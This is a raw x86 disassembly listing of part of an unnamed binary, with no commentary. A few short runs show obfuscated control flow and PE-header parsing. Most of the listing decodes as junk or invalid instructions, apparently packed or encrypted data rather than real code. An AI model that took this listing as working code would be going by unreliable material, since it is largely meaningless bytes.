  41dcd2:	or     bl,cl
  41dcd4:	jg     0x41dd34
  41dcd6:	pop    es
  41dcd7:	or     eax,0x5c89fbf8
  41dcdc:	push   0xffffffc4
  41dcde:	push   ss
  41dcdf:	push   ebp
  41dce0:	mov    bh,0x19
  41dce2:	in     al,0xf3
  41dce4:	adc    al,0xde
  41dce6:	mov    ebp,0x536d9955
  41dceb:	add    dl,BYTE PTR [ecx-0x77]
  41dcee:	lea    ebx,[edi+esi*4]
  41dcf1:	mov    eax,ds:0x6c214bc7
  41dcf6:	call   0x74cf74d7
  41dcfb:	push   ebx
  41dcfc:	lea    eax,[esp+0x6c]
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x63
  41dd5b:	pop    ecx
  41dd5c:	xchg   ecx,eax
  41dd5d:	jo     0x41dd81
  41dd5f:	inc    edi
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x2469e7e8],bh
  41dd68:	jmp    0x41dd98
  41dd6a:	and    eax,0x49762da6
  41dd6f:	stc    
  41dd70:	imul   eax,eax,0xffffffd5
  41dd73:	call   0xd587:0x6d2f4973
  41dd7a:	mov    dl,al
  41dd7c:	inc    ecx
  41dd7d:	dec    ebx
  41dd7e:	lods   eax,DWORD PTR ds:[esi]
  41dd7f:	mov    edi,edi
  41dd81:	repnz add eax,0xdb9edf46
  41dd87:	mov    esi,0x865c1daf
  41dd8c:	ss pop ebp
  41dd8e:	cmp    al,0x9a
  41dd90:	outs   dx,BYTE PTR ds:[esi]
  41dd91:	sbb    DWORD PTR [edi-0x66f14f51],ebp
  41dd97:	or     esp,0x25ede8
  41dd9d:	les    esi,FWORD PTR [edx+0x792dff20]
  41dda3:	fild   DWORD PTR [esi-0x46095a6e]
  41dda9:	pop    ebx
  41ddaa:	jns    0x41dd64
  41ddac:	repnz in al,0x72
  41ddaf:	fs sti 
  41ddb1:	and    DWORD PTR [esi],esp
  41ddb3:	cdq    
  41ddb4:	fyl2xp1 
  41ddb6:	out    0x4,eax
  41ddb8:	adc    al,0xa4
  41ddba:	(bad)  
  41ddbb:	push   esp
  41ddbc:	sti    
  41ddbd:	in     eax,dx
  41ddbe:	jns    0x41dd82
  41ddc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddc1:	jmp    0x6a797b1e
  41ddc6:	adc    dh,al
  41ddc8:	popa   
  41ddc9:	mov    ebp,0xa52573e6
  41ddce:	or     al,0xfb
  41ddd0:	(bad)  
  41ddd1:	into   
  41ddd2:	sbb    eax,eax
  41ddd4:	add    al,0x6a
  41ddd6:	mov    dh,0x43
  41ddd8:	pop    edi
  41ddd9:	(bad)  
  41ddda:	mov    cl,0x75
  41dddc:	ss xchg ebx,edi
  41dddf:	stos   DWORD PTR es:[edi],eax
  41dde0:	xchg   ecx,eax
  41dde1:	xor    eax,ebx
  41dde3:	lock hlt 
  41dde5:	push   0x57e6ac42
  41ddea:	sbb    ch,cl
  41ddec:	or     DWORD PTR [eax],eax
  41ddee:	les    ebx,FWORD PTR [esi+0x10]
  41ddf1:	push   ax
  41ddf3:	xchg   esi,eax
  41ddf4:	xchg   ecx,eax
  41ddf5:	es stos DWORD PTR es:[edi],eax
  41ddf7:	ins    DWORD PTR es:[edi],dx
  41ddf8:	xor    bh,BYTE PTR [edi]
  41ddfa:	push   esi
  41ddfb:	pop    ebx
  41ddfc:	rcr    BYTE PTR [ecx+0x50],cl
  41ddff:	data16 ror BYTE PTR [edi-0x2],0x8f
  41de04:	jg     0x41de05
  41de06:	jge    0x41de71
  41de08:	loopne 0x41dde2
  41de0a:	les    edx,FWORD PTR [esi]
  41de0c:	(bad)  
  41de0d:	pop    ecx
  41de0e:	add    BYTE PTR [ecx+0x518397a5],cl
  41de14:	mov    edx,0x94ed434a
  41de19:	jne    0x41de93
  41de1b:	xchg   BYTE PTR [eax+esi*8],ah
  41de1e:	iret   
  41de1f:	data16 jp 0x41de46
  41de22:	cmp    eax,0x683b3c35
  41de27:	outs   dx,DWORD PTR ds:[esi]
  41de28:	or     BYTE PTR [eax-0xabd592f],dl
  41de2e:	pop    ds
  41de2f:	loop   0x41de5d
  41de31:	out    dx,al
  41de32:	mov    ebp,0x17c5c094
  41de37:	lods   eax,DWORD PTR ds:[esi]
  41de38:	das    
  41de39:	dec    edx
  41de3a:	dec    ebp
  41de3b:	add    DWORD PTR ss:[eax+0x3c],ecx
  41de3f:	retf   
  41de40:	and    eax,0x786baaae
  41de45:	xor    ah,BYTE PTR [ebx]
  41de47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de48:	or     esp,esp
  41de4a:	(bad)  
  41de4c:	cmp    BYTE PTR [ecx-0x594b3b72],dh
  41de52:	fdivr  QWORD PTR [edi]
  41de54:	bound  edi,QWORD PTR [edi-0xa5ec04d]
  41de5a:	pop    ecx
  41de5b:	leave  
  41de5c:	and    cl,BYTE PTR [edi+0x17073775]
  41de62:	jg     0x41de4e
  41de64:	jle    0x41deb2
  41de66:	aaa    
  41de67:	pop    edi
  41de68:	arpl   ax,dx
  41de6a:	cmp    BYTE PTR [edx-0x43332bc0],bl
  41de70:	popf   
  41de71:	lock push cs
  41de73:	stos   BYTE PTR es:[edi],al
  41de74:	pop    es
  41de75:	pop    edx
  41de76:	xchg   dh,al
  41de78:	inc    ebp
  41de79:	and    al,0x7a
  41de7b:	mov    bl,0xec
  41de7d:	lock jbe 0x41de2b
  41de80:	jp     0x41de3d
  41de82:	sub    DWORD PTR [esi+eax*8],eax
  41de85:	dec    eax
  41de86:	daa    
  41de87:	out    dx,eax
  41de88:	outs   dx,BYTE PTR ds:[esi]
  41de89:	sbb    DWORD PTR [eiz*1+0x72928578],esi
  41de90:	je     0x41de31
  41de92:	ss dec esi
  41de94:	scas   eax,DWORD PTR es:[edi]
  41de95:	stc    
  41de96:	sub    ch,BYTE PTR [esi]
  41de98:	sar    al,1
  41de9a:	les    edi,FWORD PTR [esi]
  41de9c:	xchg   bh,al
  41de9e:	(bad)  
  41de9f:	pop    ebp
  41dea0:	mov    DWORD PTR [esi+edi*1],esi
  41dea3:	arpl   dx,bx
  41dea5:	test   al,0x62
  41dea7:	lock (bad) 
  41dea9:	adc    eax,DWORD PTR [esi+0x68e1f880]
  41deaf:	fmul   st,st(2)
  41deb1:	jmp    0x56e6c156
  41deb6:	int    0xfb
  41deb8:	inc    edx
  41deb9:	aad    0x4d
  41debb:	sbb    eax,0x125f2fc6
  41dec0:	dec    ebx
  41dec1:	dec    esp
  41dec2:	sub    eax,0x79600c7b
  41dec7:	cwde   
  41dec8:	(bad)  
  41dec9:	xchg   edi,eax
  41deca:	mov    eax,DWORD PTR [esi]
  41decc:	adc    DWORD PTR ds:0xac57c5a9,ebx
  41ded2:	repnz (bad) 
  41ded4:	xlat   BYTE PTR ds:[ebx]
  41ded5:	int3   
  41ded6:	xchg   ebp,eax
  41ded7:	pop    es
  41ded8:	ins    DWORD PTR es:[edi],dx
  41ded9:	mov    edx,0x44521cf9
  41dede:	mov    ebp,0x4ead7139
  41dee3:	pop    esi
  41dee4:	jb     0x41ded4
  41dee6:	lea    ecx,[edi]
  41dee8:	mov    esi,0x6a6d4923
  41deed:	xchg   ebx,eax
  41deee:	sahf   
  41deef:	inc    edi
  41def0:	sbb    DWORD PTR [ebp+0x2c],edi
  41def3:	mul    BYTE PTR [eax-0xdf9b7f7]
  41def9:	fcmovnu st,st(0)
  41defb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41defc:	inc    ebx
  41defd:	div    DWORD PTR [eax]
  41deff:	mov    ebp,0x2c237425
  41df04:	mov    ebx,0xb368c8ba
  41df09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df0a:	inc    edi
  41df0b:	push   0xfffffff1
  41df0d:	aaa    
  41df0e:	xchg   ebp,eax
  41df0f:	das    
  41df10:	pop    esi
  41df11:	fs push edx
  41df13:	inc    ebp
  41df14:	xchg   esp,eax
  41df15:	out    0xd0,eax
  41df17:	test   ebx,ecx
  41df19:	lds    ecx,FWORD PTR ss:[ebp+0x13]
  41df1d:	dec    esi
  41df1e:	add    BYTE PTR [edx+0x3c5f6ba5],al
  41df24:	dec    esi
  41df25:	(bad)  
  41df26:	fcmovnu st,st(4)
  41df28:	dec    ecx
  41df29:	scas   al,BYTE PTR es:[edi]
  41df2a:	clc    
  41df2b:	ss sbb edx,DWORD PTR cs:0x5d51efba
  41df33:	cmp    ebp,eax
  41df35:	scas   eax,DWORD PTR es:[edi]
  41df36:	sar    cl,1
  41df38:	sahf   
  41df39:	jmp    0x41dfa4
  41df3b:	int3   
  41df3c:	inc    ebx
  41df3d:	add    cl,BYTE PTR [eax+0x1e3649a]
  41df43:	jle    0x41df6c
  41df45:	imul   eax,DWORD PTR [ecx+0x7e],0xc3b4d9f
  41df4c:	cmp    eax,0x19857171
  41df51:	ret    
  41df52:	leave  
  41df53:	je     0x41df18
  41df55:	lods   eax,DWORD PTR ds:[esi]
  41df56:	shl    ebx,0xf9
  41df59:	daa    
  41df5a:	push   0x6d
  41df5c:	push   ebp
  41df5d:	push   cs
  41df5e:	out    0xf7,al
  41df60:	pop    es
  41df61:	rcl    BYTE PTR [eax],0x5f
  41df64:	aas    
  41df65:	sub    edi,eax
  41df67:	in     al,dx
  41df68:	mov    bl,dh
  41df6a:	pusha  
  41df6b:	lahf   
  41df6c:	mov    DWORD PTR ds:0xf6332f72,edi
  41df72:	loopne 0x41df63
  41df74:	(bad)  
  41df75:	mov    dh,0x8a
  41df77:	(bad)  
  41df78:	xchg   ebp,eax
  41df79:	jne    0x41df46
  41df7b:	push   ds
  41df7c:	dec    eax
  41df7d:	aad    0x90
  41df7f:	mov    dl,ah
  41df81:	hlt    
  41df82:	ins    DWORD PTR es:[edi],dx
  41df83:	fcmovnbe st,st(3)
  41df85:	add    esi,eax
  41df87:	mov    edi,0x14002d52
  41df8c:	pop    es
  41df8d:	imul   edi,DWORD PTR [ecx+0x78b90391],0x3d
  41df94:	int3   
  41df95:	mov    esp,0xdbf9fca9
  41df9a:	pop    ecx
  41df9b:	sahf   
  41df9c:	add    ecx,DWORD PTR [eax-0x52]
  41df9f:	adc    bl,al
  41dfa1:	pop    ss
  41dfa2:	sbb    al,0x19
  41dfa4:	aad    0xf
  41dfa6:	mov    ch,0xef
  41dfa8:	int3   
  41dfa9:	ret    
  41dfaa:	adc    BYTE PTR [edx+0x161eb716],bh
  41dfb0:	pop    ecx
  41dfb1:	data16 sti 
  41dfb3:	sahf   
  41dfb4:	jmp    0x411b5d22
  41dfb9:	jp     0x41e02e
  41dfbb:	jg     0x41dfc5
  41dfbd:	aaa    
  41dfbe:	pop    eax
  41dfbf:	sbb    DWORD PTR [ecx+0x343d418],esp
  41dfc5:	ins    BYTE PTR es:[edi],dx
  41dfc6:	and    eax,0xd63a96c7
  41dfcb:	cwde   
  41dfcc:	lahf   
  41dfcd:	add    BYTE PTR [ebx-0x8],dh
  41dfd0:	sbb    BYTE PTR [eax],ch
  41dfd2:	loopne 0x41df88
  41dfd4:	pushf  
  41dfd5:	rcr    eax,1
  41dfd7:	mov    ecx,0x21e44815
  41dfdc:	mov    eax,ebx
  41dfde:	stc    
  41dfdf:	push   cs
  41dfe0:	pop    edx
  41dfe1:	adc    edx,DWORD PTR [ebx+0x5862aef4]
  41dfe7:	enter  0x46c9,0xe1
  41dfeb:	out    dx,eax
  41dfec:	jecxz  0x41e006
  41dfee:	mov    esp,0xd511844c
  41dff3:	rcr    DWORD PTR [edx+0x24b47806],1
  41dff9:	or     al,0x59
  41dffb:	stc    
  41dffc:	aaa    
  41dffd:	adc    esi,eax
  41dfff:	jl     0x41df89
  41e001:	outs   dx,BYTE PTR ds:[esi]
  41e002:	mov    ?,WORD PTR [eax+0x77]
  41e005:	repz cmp bl,BYTE PTR [ecx-0x54731236]
  41e00c:	imul   edx,DWORD PTR [edi-0x25],0x2a
  41e010:	imul   edx,DWORD PTR [esi-0xb7df0f5],0x40e1e006
  41e01a:	sbb    eax,0xdec424fd
  41e01f:	mov    dl,0x43
  41e021:	popf   
  41e022:	add    esi,ebp
  41e024:	(bad)  
  41e025:	ss test eax,0xd6b2b841
  41e02b:	sub    dl,BYTE PTR gs:[eax]
  41e02e:	xchg   ebp,eax
  41e02f:	fwait
  41e030:	and    BYTE PTR [edi-0x3102a2fc],dl
  41e036:	(bad)  
  41e037:	out    0xeb,eax
  41e039:	retf   
  41e03a:	mov    ecx,0x298bf48d
  41e03f:	jecxz  0x41e091
  41e041:	adc    DWORD PTR [ecx],0x15a32906
  41e047:	in     al,0x7d
  41e049:	jne    0x41dff6
  41e04b:	scas   eax,DWORD PTR es:[edi]
  41e04c:	adc    DWORD PTR [ecx-0x8977106],ecx
  41e052:	rcl    esi,0x6a
  41e055:	inc    ebx
  41e056:	pushf  
  41e057:	fwait
  41e058:	add    dl,bh
  41e05a:	mov    ah,0x98
  41e05c:	aam    0xaa
  41e05e:	in     al,0x1f
  41e060:	xchg   ecx,eax
  41e061:	aam    0x1a
  41e063:	mov    edi,0xa5101ac7
  41e068:	or     BYTE PTR [ebx],dh
  41e06a:	dec    edi
  41e06b:	sbb    eax,0x69cb8957
  41e070:	out    dx,eax
  41e071:	hlt    
  41e072:	inc    esi
  41e073:	jp     0x41e07f
  41e075:	loopne 0x41e0bc
  41e077:	add    BYTE PTR [ebp+0xe5f9d73],dh
  41e07d:	into   
  41e07e:	mov    ch,0x6f
  41e080:	or     ecx,ebp
  41e082:	and    eax,0x376bd1f1
  41e087:	cmp    BYTE PTR [esi+0x44f1fae2],al
  41e08d:	ficom  DWORD PTR [edx+0x68]
  41e090:	push   ebp
  41e091:	test   DWORD PTR [edi-0x5e],esp
  41e094:	popf   
  41e095:	or     ah,ah
  41e097:	jne    0x41e072
  41e099:	mov    cl,0xbd
  41e09b:	ja     0x41e043
  41e09d:	imul   ebx,esi,0xffffffe9
  41e0a0:	mov    ah,0x89
  41e0a2:	cs cmp eax,0xac7fe3e0
  41e0a8:	dec    ebp
  41e0a9:	mov    ebx,es
  41e0ab:	xchg   ebx,eax
  41e0ac:	inc    ecx
  41e0ad:	push   edi
  41e0ae:	mov    al,0xd
  41e0b0:	xchg   ebx,eax
  41e0b1:	add    cl,cl
  41e0b3:	cs imul al
  41e0b6:	sub    al,BYTE PTR [edx+edx*4]
  41e0b9:	lods   al,BYTE PTR ds:[esi]
  41e0ba:	push   0xffffff86
  41e0bc:	loop   0x41e0c1
  41e0be:	inc    esi
  41e0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0c0:	lock pop ebp
  41e0c2:	mov    edx,0x4b35afb
  41e0c7:	adc    DWORD PTR [ecx+0x7695dbd3],0x16
  41e0ce:	shl    BYTE PTR [esi-0x102a1c22],1
  41e0d4:	fst    QWORD PTR [eax+0x3cb6846f]
  41e0da:	das    
  41e0db:	jmp    0xa147:0x86f643b2
  41e0e2:	mov    edi,0x6cd8a31e
  41e0e7:	dec    ebp
  41e0e8:	mov    ch,0xbc
  41e0ea:	mov    ebp,0xce048c61
  41e0ef:	and    ch,BYTE PTR cs:[eax]
  41e0f2:	bnd jno 0x41e12e
  41e0f5:	fwait
  41e0f6:	cmp    bl,BYTE PTR [eax-0x2]
  41e0f9:	stos   BYTE PTR es:[edi],al
  41e0fa:	push   es
  41e0fb:	jmp    0x41e11b
  41e0fd:	fcomip st,st(2)
  41e0ff:	dec    esi
  41e100:	ficom  DWORD PTR [ecx-0x690fa30]
  41e106:	ins    DWORD PTR es:[edi],dx
  41e107:	push   ebp
  41e108:	ficom  DWORD PTR [eax]
  41e10a:	push   esi
  41e10b:	sbb    ch,al
  41e10d:	sbb    DWORD PTR [edi+0x539e147b],0x69fbed0e
  41e117:	hlt    
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	or     bl,BYTE PTR [ebx+0x3fc6b06f]
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1+0x55b81818],bh
  41e1ff:	jne    0x41e230
  41e201:	or     dh,cl
  41e203:	jmp    0x41e1de
  41e205:	dec    ecx
  41e207:	bound  edx,QWORD PTR [ecx+0x71f8c056]
  41e20d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e20e:	or     esp,0xffffffc7
  41e211:	push   ecx
  41e212:	jb     0x41e1e0
  41e214:	loop   0x41e1e2
  41e216:	cmp    dl,cl
  41e218:	dec    edx
  41e219:	sbb    edi,DWORD PTR [edx]
  41e21b:	jnp    0x41e1f3
  41e21d:	out    0x82,al
  41e21f:	int    0x9a
  41e221:	push   esi
  41e222:	dec    ecx
  41e223:	rcr    bh,cl
  41e225:	cmp    eax,DWORD PTR [eax+edi*2-0x7d1b5e30]
  41e22c:	out    dx,al
  41e22d:	inc    bh
  41e22f:	aad    0xf6
  41e231:	and    al,0xfb
  41e233:	mov    eax,0x9b0038ee
  41e238:	into   
  41e239:	xor    bl,BYTE PTR [ebx+edx*1+0x21bf5387]
  41e240:	adc    ebx,DWORD PTR [ebx+0x3d]
  41e243:	jns    0x41e230
  41e245:	mov    DWORD PTR ds:0xd846dbf0,esi
  41e24b:	mov    edi,0x9c57526d
  41e250:	mov    dl,0xc
  41e252:	lock and eax,0xfe01c5ec
  41e258:	dec    eax
  41e259:	retf   
  41e25a:	push   esi
  41e25b:	adc    BYTE PTR [ebx],ch
  41e25d:	jmp    0x41e2de
  41e25f:	enter  0x4c39,0x5e
  41e263:	hlt    
  41e264:	and    dl,al
  41e266:	lahf   
  41e267:	retf   0x43d8
  41e26a:	shl    ch,cl
  41e26c:	adc    bh,BYTE PTR [ebx+edi*8-0x4c]
  41e270:	jl     0x41e2af
  41e272:	mov    esp,0xda538389
  41e277:	adc    eax,0x1c558898
  41e27c:	vshufpd ymm7,ymm0,YMMWORD PTR ds:0xbe9ceb03,0xff
  41e285:	add    eax,0x7c80f45b
  41e28a:	pop    es
  41e28b:	pmulhuw mm7,QWORD PTR [esi+0x6b4a1dc3]
  41e292:	je     0x41e30a
  41e294:	ret    0x4575
  41e297:	(bad)  
  41e298:	div    BYTE PTR [edx+0x1]
  41e29b:	not    bl
  41e29d:	mov    edx,0x4a3765cc
  41e2a2:	xchg   edi,eax
  41e2a3:	push   ebp
  41e2a4:	mov    ch,0xa0
  41e2a6:	stos   BYTE PTR es:[edi],al
  41e2a7:	fdivr  DWORD PTR [eax+0x8]
  41e2aa:	dec    eax
  41e2ab:	push   0x9b0de7ed
  41e2b0:	sbb    BYTE PTR [eax+0x39],al
  41e2b3:	lock in al,dx
  41e2b5:	pop    es
  41e2b6:	inc    esi
  41e2b7:	ss in  al,dx
  41e2b9:	mov    ds:0x564b8d34,eax
  41e2be:	push   esp
  41e2bf:	out    dx,al
  41e2c0:	sar    DWORD PTR [edi+0x4a22443c],cl
  41e2c6:	adc    ch,bh
  41e2c8:	sbb    esi,DWORD PTR [edi]
  41e2ca:	add    ebx,esi
  41e2cc:	or     BYTE PTR [ebx],al
  41e2ce:	inc    ebp
  41e2cf:	dec    ecx
  41e2d0:	mov    esi,0x48572ce4
  41e2d5:	shr    DWORD PTR [edi],0xe6
  41e2d8:	inc    ebx
  41e2d9:	ins    DWORD PTR es:[edi],dx
  41e2da:	scas   eax,DWORD PTR es:[edi]
  41e2db:	push   edi
  41e2dc:	xchg   edi,eax
  41e2dd:	je     0x41e2b8
  41e2df:	imul   eax,ebp,0x771c29b4
  41e2e5:	mov    eax,ds:0xb8d3bbe9
  41e2ea:	mov    esp,0x80b35139
  41e2ef:	sub    bh,0x82
  41e2f2:	sub    BYTE PTR [ecx-0x76],ch
  41e2f5:	pop    ds
  41e2f6:	daa    
  41e2f7:	dec    esp
  41e2f8:	(bad)  
  41e2f9:	out    0x2d,al
  41e2fb:	jne    0x41e367
  41e2fd:	aaa    
  41e2fe:	mov    edi,0x3fde868f
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	shl    DWORD PTR ds:0xeb6c2305,1
  41e30a:	mov    ebp,0x4800d712
  41e30f:	loope  0x41e2f1
  41e311:	xor    al,0x5d
  41e313:	and    al,0x6a
  41e315:	ror    BYTE PTR [eax],cl
  41e317:	pop    ecx
  41e318:	dec    esp
  41e319:	out    0xf9,eax
  41e31b:	inc    edx
  41e31c:	add    al,0xfb
  41e31e:	push   edx
  41e31f:	push   0xffffffba
  41e321:	jmp    0xa73e6ec9
  41e326:	je     0x41e359
  41e328:	repnz mov WORD PTR ss:[ecx+eax*4+0x66],ds
  41e32e:	cs es mov edi,0x67ff518f
  41e335:	jo     0x41e31e
  41e337:	out    dx,eax
  41e338:	mov    eax,0xe8fd7631
  41e33d:	inc    esi
  41e33e:	cwde   
  41e33f:	sub    al,0xf4
  41e341:	clc    
  41e342:	xchg   esp,eax
  41e343:	test   BYTE PTR [esi+0x1d],ah
  41e346:	aas    
  41e347:	repz adc al,0x25
  41e34a:	inc    edi
  41e34b:	mov    cl,0x3c
  41e34d:	lods   eax,DWORD PTR ds:[esi]
  41e34e:	pop    esp
  41e34f:	fwait
  41e350:	retf   
  41e351:	xor    DWORD PTR [esp+edi*8+0xe],ecx
  41e355:	enter  0xbc52,0x2c
  41e359:	xchg   ebx,eax
  41e35a:	and    dh,BYTE PTR [edx+0x6955ef7]
  41e360:	sub    al,BYTE PTR [ebx-0x55]
  41e363:	sar    DWORD PTR [ebx+0x3a8f962c],1
  41e369:	mov    ds:0x1f74279c,eax
  41e36e:	stos   DWORD PTR es:[edi],eax
  41e36f:	and    ah,dl
  41e371:	or     dl,BYTE PTR [eax-0x5f7056b4]
  41e377:	pusha  
  41e378:	mov    bh,0xdd
  41e37a:	add    eax,0x85a0a4d
  41e37f:	clc    
  41e380:	retf   0x574e
  41e383:	nop    DWORD PTR [ecx+eax*8+0x24]
  41e388:	in     eax,dx
  41e389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e38a:	mov    ah,0x13
  41e38c:	loope  0x41e34b
  41e38e:	jmp    0x41e38a
  41e390:	ret    0x7478
  41e393:	and    BYTE PTR [edi],0x50
  41e396:	dec    ebp
  41e397:	outs   dx,DWORD PTR ds:[esi]
  41e398:	daa    
  41e399:	sub    edi,DWORD PTR [eax-0x5e]
  41e39c:	xchg   edx,eax
  41e39d:	arpl   WORD PTR [ebp+0x12],cx
  41e3a0:	out    dx,eax
  41e3a1:	call   0x9e3f:0x8b93c6df
  41e3a8:	cmp    BYTE PTR [ecx-0x3b],bl
  41e3ab:	clc    
  41e3ac:	push   cs
  41e3ad:	ret    
  41e3ae:	mov    dl,0xae
  41e3b0:	pop    edi
  41e3b1:	daa    
  41e3b2:	loop   0x41e3df
  41e3b4:	pop    ebx
  41e3b5:	dec    edi
  41e3b6:	inc    ebx
  41e3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3b8:	or     dl,dl
  41e3ba:	arpl   WORD PTR [ebx-0x72a2013],si
  41e3c0:	out    0xf5,eax
  41e3c2:	pushf  
  41e3c3:	daa    
  41e3c4:	push   esp
  41e3c5:	push   ecx
  41e3c6:	mov    dl,0x60
  41e3c8:	call   0x10325a42
  41e3cd:	jmp    0xf6bc:0x4dd6d1bf
  41e3d4:	sbb    eax,0x6bdbe1ca
  41e3d9:	push   0xffffffc6
  41e3db:	daa    
  41e3dc:	scas   eax,DWORD PTR es:[edi]
  41e3dd:	xchg   edx,eax
  41e3de:	rep stos BYTE PTR es:[edi],al
  41e3e0:	cwde   
  41e3e1:	inc    esp
  41e3e2:	out    dx,eax
  41e3e3:	dec    eax
  41e3e4:	fimul  WORD PTR [edi]
  41e3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3e7:	add    BYTE PTR es:0x74284c33,al
  41e3ee:	push   esi
  41e3ef:	xor    al,ah
  41e3f1:	(bad)  
  41e3f2:	in     eax,0x43
  41e3f4:	in     eax,0xd6
  41e3f6:	aam    0x1e
  41e3f8:	dec    esi
  41e3f9:	lods   al,BYTE PTR ds:[esi]
  41e3fa:	(bad)  
  41e3fb:	mov    ds:0x42970f66,al
  41e401:	fild   WORD PTR [eax-0x7e631fe4]
  41e407:	sbb    BYTE PTR [eax-0x6],bh
  41e40a:	jno    0x41e485
  41e40c:	xor    ebx,edi
  41e40e:	int3   
  41e40f:	add    DWORD PTR ss:[edx+0x3a],esp
  41e413:	std    
  41e414:	scas   al,BYTE PTR es:[edi]
  41e415:	jmp    0x41e444
  41e417:	aad    0x60
  41e419:	test   al,0xab
  41e41b:	(bad)  
  41e41c:	aas    
  41e41d:	cmp    DWORD PTR [ecx-0x20],0x4b994518
  41e424:	push   ds
  41e425:	gs retf 0x5f80
  41e429:	ins    DWORD PTR es:[edi],dx
  41e42a:	not    dl
  41e42c:	enter  0x27b2,0xe4
  41e430:	xor    BYTE PTR [ebx],ah
  41e432:	fs sbb cl,0x57
  41e436:	mov    WORD PTR [edx],ds
  41e438:	fdivr  QWORD PTR [edx-0x6cdef889]
  41e43e:	sti    
  41e43f:	std    
  41e440:	and    ebx,DWORD PTR [edx+0x32]
  41e443:	mov    bh,0x6d
  41e445:	jecxz  0x41e482
  41e447:	imul   eax,DWORD PTR [ebx+0x4c],0x5
  41e44b:	js     0x41e4c8
  41e44d:	adc    BYTE PTR ds:0x712e0edb,bh
  41e453:	shr    BYTE PTR [ebx-0x51fb71e9],1
  41e459:	js     0x41e4a7
  41e45b:	mov    eax,0x2618de9b
  41e460:	ror    BYTE PTR [eax+0x49],1
  41e463:	test   DWORD PTR [edx+0x7e],0xf969b477
  41e46a:	scas   al,BYTE PTR es:[edi]
  41e46b:	pop    edi
  41e46c:	xor    al,0xaa
  41e46e:	int3   
  41e46f:	mov    al,BYTE PTR [edx]
  41e471:	sub    DWORD PTR [esp+edx*4+0x43dc359f],esp
  41e478:	mov    sp,0xa23b
  41e47c:	xchg   esp,eax
  41e47d:	and    eax,0x40c4555a
  41e482:	mov    bl,BYTE PTR [ebp+0xc]
  41e485:	dec    ebp
  41e486:	and    al,0x27
  41e488:	adc    al,0x42
  41e48a:	pushf  
  41e48b:	jnp    0x41e472
  41e48d:	cmp    esi,DWORD PTR [edi-0x7f9c1f9a]
  41e493:	out    dx,eax
  41e494:	daa    
  41e495:	std    
  41e496:	sub    bh,BYTE PTR [edi]
